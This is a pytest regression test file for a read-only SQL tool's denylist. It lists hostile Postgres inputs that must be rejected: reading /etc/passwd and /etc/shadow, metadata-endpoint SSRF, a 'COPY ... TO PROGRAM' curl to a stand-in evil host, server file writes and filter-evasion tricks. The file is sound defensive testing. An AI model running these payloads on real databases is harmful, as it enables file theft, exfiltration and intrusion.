"""Regression: read-only ``sql_query`` rejects side-effecting SQL functions.

Friend-audit finding #5: a Postgres ``READ ONLY`` transaction blocks writes but NOT
file-reading / network / DoS functions (``pg_read_file``, ``dblink``, the ``http``
extension, ``pg_sleep``, ``COPY ... PROGRAM``). The fix adds a denylist as defense in
depth (the primary control remains a least-privilege DB role).
"""

from __future__ import annotations

import pytest

from himmy.toolkit.data import ToolSecurityError, _single_statement


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/')",
        "SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)",
        "SELECT lo_import('/etc/passwd')",
        "SELECT pg_sleep(30)",
        "SELECT http_get('http://169.254.169.254/latest/meta-data/')",
        "COPY (SELECT 1) TO PROGRAM 'curl http://evil.example.com'",
        "select PG_READ_FILE('/etc/shadow')",  # case-insensitive
        "SELECT PG_CATALOG.pg_read_file('/etc/passwd')",  # schema-qualified
        # underlying primitives the banned wrappers call (re-attack found these):
        "SELECT (http(ROW('GET','http://169.254.169.254/',NULL,NULL,NULL)::http_request)).content",
        "SELECT loread(lo_open(12345, 262144), 1000000)",
        "SELECT lo_open(12345, 262144)",
        # server-file write/read via COPY + adminpack + DoS + config:
        "COPY (SELECT 1) TO '/tmp/exfil.csv'",
        "COPY secrets FROM '/etc/passwd'",
        "SELECT pg_file_write('/tmp/x', 'data', false)",
        "SELECT pg_advisory_lock(1)",
        "SELECT set_config('search_path', 'evil', false)",
        # evasion attempts the re-attack found (Unicode-escape names + comment splitting):
        r"""SELECT U&"pg_read_fil\0065"('/etc/passwd')""",
        "SELECT http/**/(ROW('GET','http://169.254.169.254/',NULL,NULL,NULL)::http_request)",
        "SELECT pg_read_file --c\n ('/etc/passwd')",
        "DO $$ BEGIN PERFORM pg_read_file('/etc/passwd'); END $$",
        "do $$begin execute 'pg_read'||'_file'; end$$",  # dynamic name built at runtime
        # prefix-match coverage (re-attack residuals): dblink* incl. the _u variant, lo write,
        # other pg_ls_* listers, replication-slot drop
        "SELECT dblink_connect_u('host=evil port=5432 dbname=x')",
        "SELECT lo_from_bytea(0, '\\x41')",
        "SELECT pg_ls_tmpdir()",
        "SELECT pg_drop_replication_slot('s')",
    ],
)
def test_dangerous_sql_rejected(sql: str) -> None:
    with pytest.raises(ToolSecurityError):
        _single_statement(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT id, name FROM users WHERE id = $1",
        "SELECT count(*) FROM orders",
        "WITH t AS (SELECT 1 AS n) SELECT n FROM t",
        "SELECT amount, created_at FROM payments ORDER BY created_at DESC",
    ],
)
def test_normal_read_query_allowed(sql: str) -> None:
    assert _single_statement(sql) == sql.strip()
